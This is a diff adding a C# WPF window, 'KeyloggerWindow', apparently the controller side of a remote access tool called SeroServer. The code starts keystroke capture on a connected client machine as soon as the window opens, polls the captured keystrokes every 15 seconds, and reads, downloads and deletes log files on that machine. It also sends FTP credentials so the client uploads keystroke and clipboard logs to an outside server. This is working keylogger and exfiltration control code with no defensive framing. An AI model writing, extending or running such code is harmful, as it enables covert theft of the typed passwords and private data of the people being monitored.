@@ -1,0 +1,379 @@
+using System.IO;
+using System.Windows;
+using System.Windows.Input;
+using System.Windows.Threading;
+using DevExpress.Xpf.Core;
+using Newtonsoft.Json;
+using SeroServer.Net;
+using SeroServer.Protocol;
+
+namespace SeroServer.UI;
+
+public partial class KeyloggerWindow : ThemedWindow
+{
+    private readonly TlsServer _server;
+    private readonly string    _clientId;
+    private bool               _capturing;
+    private bool               _ftpConfigured;
+    private string             _currentFilename = "";
+
+    private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, KeyloggerFtpConfigData>
+        _ftpCache = new();
+    private readonly DispatcherTimer _autoRefresh = new() { Interval = TimeSpan.FromSeconds(15) };
+
+    public KeyloggerWindow(TlsServer server, string clientId, string clientLabel)
+    {
+        InitializeComponent();
+        _server   = server;
+        _clientId = clientId;
+        TxtTitle.Text = clientLabel;
+
+        _server.RegisterHandler(clientId, PacketType.KeyloggerLogsResult,  OnLogsResult);
+        _server.RegisterHandler(clientId, PacketType.KeyloggerFilesResult, OnFilesResult);
+        _server.RegisterHandler(clientId, PacketType.KeyloggerFileContent, OnFileContent);
+        _server.RegisterHandler(clientId, PacketType.KeyloggerFtpStatus,   OnFtpStatus);
+        _server.ClientDisconnected += OnClientDisconnected;
+
+        _autoRefresh.Tick += (_, _) => { if (_capturing) RequestLogs(); };
+        Lang.LanguageChanged += ApplyLanguage;
+        ApplyLanguage();
+        Closed += (_, _) =>
+        {
+            _autoRefresh.Stop();
+            _server.UnregisterHandler(clientId, PacketType.KeyloggerLogsResult);
+            _server.UnregisterHandler(clientId, PacketType.KeyloggerFilesResult);
+            _server.UnregisterHandler(clientId, PacketType.KeyloggerFileContent);
+            _server.UnregisterHandler(clientId, PacketType.KeyloggerFtpStatus);
+            _server.ClientDisconnected -= OnClientDisconnected;
+            Lang.LanguageChanged -= ApplyLanguage;
+            ServerWindow.ReportGlobalActivity("Keylogger window closed", _clientId, "complete");
+            ServerWindow.LogGlobal($"[KEYLOG] Keylogger window closed for client {_clientId} (still capturing on client).");
+        };
+
+        // Auto-start capturing on open + immediately fetch live buffer + file list
+        Loaded += async (_, _) =>
+        {
+            try
+            {
+                // Restore cached FTP settings from a previous window open so the operator
+                // can see what was last applied without having to re-enter credentials.
+                if (_ftpCache.TryGetValue(_clientId, out var cached))
+                {
+                    _ftpConfigured      = true;
+                    TxtFtpHost.Text     = cached.FtpHost;
+                    TxtFtpPort.Text     = cached.FtpPort.ToString();
+                    TxtFtpUser.Text     = cached.FtpUser;
+                    TxtFtpPath.Text     = cached.FtpPath;
+                    TxtMaxSizeKb.Text   = cached.MaxSizeKb.ToString();
+                    ChkClipboard.IsChecked = cached.ClipboardEnabled;
+                    TxtFtpStatus.Text   = string.Format(Lang.Get("KL_FTP_APPLIED"), cached.MaxSizeKb);
+                }
+
+                await Task.Delay(Random.Shared.Next(0, 250));
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
+                _capturing = true; UpdateBadge(); _autoRefresh.Start();
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
+                ServerWindow.ReportGlobalActivity("Keylogger started", _clientId, "complete");
+                ServerWindow.LogGlobal($"[KEYLOG] Keylogger started for client {_clientId}.");
+            }
+            catch { }
+        };
+    }
+
+    private void ApplyLanguage()
+    {
+        this.Title = Lang.Get("FEAT_KEYLOGGER");
+        if (TxtBtnActions   != null) TxtBtnActions.Text   = Lang.Get("ACT_ACTIONS");
+        if (TxtBtnKlRefresh != null) TxtBtnKlRefresh.Text = Lang.Get("ACT_REFRESH");
+        if (MnuKlDownload   != null) MnuKlDownload.Header = Lang.Get("ACT_DOWNLOAD");
+        if (MnuKlDelete     != null) MnuKlDelete.Header   = Lang.Get("ACT_DELETE");
+        if (MnuKlCopyName   != null) MnuKlCopyName.Header = Lang.Get("ACT_COPY_NAME");
+        if (MnuKlRefresh    != null) MnuKlRefresh.Header  = Lang.Get("ACT_REFRESH");
+        if (BtnDownloadFile     != null) BtnDownloadFile.Content     = Lang.Get("ACT_DOWNLOAD");
+        if (BtnDeleteFile       != null) BtnDeleteFile.Content       = Lang.Get("ACT_DELETE");
+        if (TxtLogFilesHeader   != null) TxtLogFilesHeader.Text      = Lang.Get("KL_LOG_FILES");
+        if (BtnSaveAsTxt        != null) BtnSaveAsTxt.Content        = Lang.Get("KL_SAVE_AS_TXT");
+        if (TxtAutoUploadLabel  != null) TxtAutoUploadLabel.Text     = Lang.Get("KL_AUTO_UPLOAD");
+        if (TxtFtpHostLabel     != null) TxtFtpHostLabel.Text        = Lang.Get("KL_FTP_HOST");
+        if (TxtFtpPortLabel     != null) TxtFtpPortLabel.Text        = Lang.Get("KL_FTP_PORT");
+        if (TxtFtpUserLabel     != null) TxtFtpUserLabel.Text        = Lang.Get("KL_FTP_USER");
+        if (TxtFtpPassLabel     != null) TxtFtpPassLabel.Text        = Lang.Get("KL_FTP_PASSWORD");
+        if (TxtFtpPathLabel     != null) TxtFtpPathLabel.Text        = Lang.Get("KL_FTP_REMOTE_PATH");
+        if (TxtMaxSizeKbLabel   != null) TxtMaxSizeKbLabel.Text      = Lang.Get("KL_FTP_MAX_SIZE_KB");
+        if (ChkClipboard        != null) ChkClipboard.Content        = Lang.Get("KL_FTP_CLIPBOARD");
+        if (BtnFtpApply         != null) BtnFtpApply.Content         = Lang.Get("KL_FTP_APPLY");
+        if (TxtFtpStatus != null && !_ftpConfigured)
+            TxtFtpStatus.Text = Lang.Get("KL_NOT_CONFIGURED");
+        if (TxtViewerTitle  != null && string.IsNullOrEmpty(_currentFilename))
+            TxtViewerTitle.Text = Lang.Get("KL_SELECT_FILE");
+    }
+
+    // ── Outgoing ────────────────────────────────────────────────────────────
+
+    private async void RequestLogs()
+    {
+        try { await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs }); } catch { }
+    }
+
+    private async void RequestFileList()
+    {
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
+            TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
+        }
+        catch { }
+    }
+
+    // ── Incoming ────────────────────────────────────────────────────────────
+
+    private void OnLogsResult(Packet pkt)
+    {
+        try
+        {
+            var data = JsonConvert.DeserializeObject<KeyloggerLogsResultData>(pkt.Data);
+            if (data == null) return;
+            if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                _capturing = data.IsRunning;
+                UpdateBadge();
+                if (!string.IsNullOrEmpty(data.Logs))
+                {
+                    NotificationService.NotifyKeylogReceived();
+                    TxtLog.AppendText(data.Logs);
+                    var full = TxtLog.Text;
+                    if (full.Length > 50000)
+                        TxtLog.Text = full[^50000..];
+                    TxtLog.ScrollToEnd();
+                    TxtViewerTitle.Text = $"Live buffer — {(_capturing ? "ON" : "OFF")}";
+                }
+                TxtStatus.Text = _capturing ? Lang.Get("KL_CAPTURING") : Lang.Get("STOPPED");
+            });
+        }
+        catch { }
+    }
+
+    private void OnFilesResult(Packet pkt)
+    {
+        try
+        {
+            var data = JsonConvert.DeserializeObject<KeyloggerFilesResultData>(pkt.Data);
+            if (data == null) return;
+            if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                _capturing = data.IsRunning;
+                UpdateBadge();
+
+                ListFiles.Items.Clear();
+                foreach (var f in data.Files)
+                    ListFiles.Items.Add(new LogFileVM(f.Filename, f.Size));
+
+                TxtStatus.Text = string.Format(Lang.Get("KL_STATUS"), data.Files.Count, _capturing ? Lang.Get("KL_YES") : Lang.Get("KL_NO"));
+            });
+        }
+        catch { }
+    }
+
+    private void OnFileContent(Packet pkt)
+    {
+        try
+        {
+            var data = JsonConvert.DeserializeObject<KeyloggerFileContentData>(pkt.Data);
+            if (data == null) return;
+            if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                TxtLog.Text = data.Content;
+                TxtViewerTitle.Text = data.Filename;
+                TxtLog.ScrollToEnd();
+                TxtStatus.Text = string.Format(Lang.Get("KL_LOADED"), data.Filename, data.Content.Length.ToString("N0"));
+            });
+        }
+        catch { }
+    }
+
+    private void OnFtpStatus(Packet pkt)
+    {
+        try
+        {
+            var d = JsonConvert.DeserializeObject<KeyloggerFtpStatusData>(pkt.Data);
+            if (d == null) return;
+            if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                TxtFtpStatus.Text = d.Event switch
+                {
+                    "uploading" => $"⬆ Uploading {d.Filename}…",
+                    "uploaded"  => $"✓ Uploaded {d.Filename}",
+                    "retry"     => $"↻ Retry {d.Attempt}/3 — {d.Message}",
+                    "failed"    => $"✗ Failed: {d.Message}",
+                    _           => d.Event
+                };
+            });
+        }
+        catch { }
+    }
+
+    // ── Button handlers ──────────────────────────────────────────────────────
+
+    private async void BtnFtpApply_Click(object s, RoutedEventArgs e)
+    {
+        var host    = TxtFtpHost.Text.Trim();
+        var portStr = TxtFtpPort.Text.Trim();
+        var user    = TxtFtpUser.Text.Trim();
+        var pass    = TxtFtpPass.Password;
+        var path    = TxtFtpPath.Text.Trim();
+        var sizeStr = TxtMaxSizeKb.Text.Trim();
+        var clip    = ChkClipboard.IsChecked == true;
+
+        if (string.IsNullOrEmpty(host))
+        { TxtFtpStatus.Text = Lang.Get("KL_FTP_HOST_REQUIRED"); return; }
+        if (!int.TryParse(portStr, out var port) || port < 1 || port > 65535)
+        { TxtFtpStatus.Text = Lang.Get("KL_FTP_INVALID_PORT"); return; }
+        if (!int.TryParse(sizeStr, out var maxKb) || maxKb < 1)
+        { TxtFtpStatus.Text = Lang.Get("KL_FTP_INVALID_SIZE"); return; }
+
+        try
+        {
+            var cfg = new KeyloggerFtpConfigData
+            {
+                FtpHost          = host,
+                FtpPort          = port,
+                FtpUser          = user,
+                FtpPass          = pass,
+                FtpPath          = string.IsNullOrEmpty(path) ? "/" : path,
+                MaxSizeKb        = maxKb,
+                ClipboardEnabled = clip
+            };
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.KeyloggerFtpConfig,
+                Data = JsonConvert.SerializeObject(cfg)
+            });
+            _ftpConfigured = true;
+            _ftpCache[_clientId] = cfg;
+            TxtFtpStatus.Text = string.Format(Lang.Get("KL_FTP_APPLIED"), maxKb);
+        }
+        catch (Exception ex)
+        {
+            TxtFtpStatus.Text = $"✗ Send failed: {ex.Message}";
+        }
+    }
+
+    private void BtnRefresh_Click(object s, RoutedEventArgs e) => RequestFileList();
+
+    private void ListFiles_CopyName_Click(object s, RoutedEventArgs e)
+    {
+        if (ListFiles.SelectedItem is not LogFileVM vm) return;
+        try { System.Windows.Clipboard.SetText(vm.Filename); } catch { }
+        TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Filename);
+    }
+
+    private async void ListFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
+    {
+        try
+        {
+            if (ListFiles.SelectedItem is not LogFileVM vm) return;
+            _currentFilename = vm.Filename;
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.KeyloggerGetFile,
+                Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("KL_LOADING"), vm.Filename);
+        }
+        catch { }
+    }
+
+    private async void BtnDelete_Click(object s, RoutedEventArgs e)
+    {
+        try
+        {
+            if (ListFiles.SelectedItem is not LogFileVM vm) return;
+            if (MessageBox.Show(string.Format(Lang.Get("KL_DELETE_CONFIRM"), vm.Filename), Lang.Get("MSG_CONFIRM"),
+                MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.KeyloggerDeleteFile,
+                Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
+            });
+            ServerWindow.ReportGlobalActivity("Delete keylog", vm.Filename, "complete");
+            ServerWindow.LogGlobal($"[KEYLOG] Deleted log file '{vm.Filename}' on client {_clientId}.");
+            await Task.Delay(400);
+            RequestFileList();
+            TxtLog.Clear();
+            TxtViewerTitle.Text = Lang.Get("KL_SELECT_FILE");
+        }
+        catch { }
+    }
+
+    private void BtnDownload_Click(object s, RoutedEventArgs e)
+    {
+        if (string.IsNullOrEmpty(TxtLog.Text) || string.IsNullOrEmpty(_currentFilename))
+        { TxtStatus.Text = Lang.Get("KL_NOTHING_TO_DL"); return; }
+
+        var dlg = new Microsoft.Win32.SaveFileDialog
+        {
+            Filter   = "Text Files (*.txt)|*.txt",
+            FileName = _currentFilename
+        };
+        if (dlg.ShowDialog() != true) return;
+        File.WriteAllText(dlg.FileName, TxtLog.Text, System.Text.Encoding.UTF8);
+        NotificationService.NotifyDownloadComplete();
+        TxtStatus.Text = string.Format(Lang.Get("SAVED"), dlg.FileName);
+    }
+
+    private void BtnSave_Click(object s, RoutedEventArgs e) => BtnDownload_Click(s, e);
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _autoRefresh.Stop();
+            _capturing = false;
+            UpdateBadge();
+            TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
+        });
+    }
+
+    private void UpdateBadge()
+        => BadgeRunning.Visibility = _capturing ? Visibility.Visible : Visibility.Collapsed;
+
+    private void Close_Click(object s, RoutedEventArgs e) => Close();
+
+    private void ListFiles_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
+    {
+        if (ListFiles.SelectedItem == null) e.Handled = true;
+    }
+
+    private void BtnMenu_Click(object sender, RoutedEventArgs e)
+    {
+        if (sender is not System.Windows.Controls.Button btn) return;
+        var mainWindow = System.Windows.Application.Current.Windows.OfType<ServerWindow>().FirstOrDefault();
+        if (mainWindow == null) return;
+        var menu = FeatureContextMenu.Build(_server, _clientId, mainWindow, "KeyloggerWindow");
+        btn.ContextMenu = menu;
+        menu.PlacementTarget = btn;
+        menu.Placement = System.Windows.Controls.Primitives.PlacementMode.Bottom;
+        menu.IsOpen = true;
+    }
+}
+
+public class LogFileVM
+{
+    public string Filename    { get; }
+    public string DateDisplay { get; }
+    public string SizeDisplay { get; }
+
+    public LogFileVM(string filename, long size)
+    {
+        Filename    = filename;
+        DateDisplay = System.IO.Path.GetFileNameWithoutExtension(filename);
+        SizeDisplay = size < 1024 ? $"{size} B" : $"{size / 1024.0:F1} KB";
+    }
+}
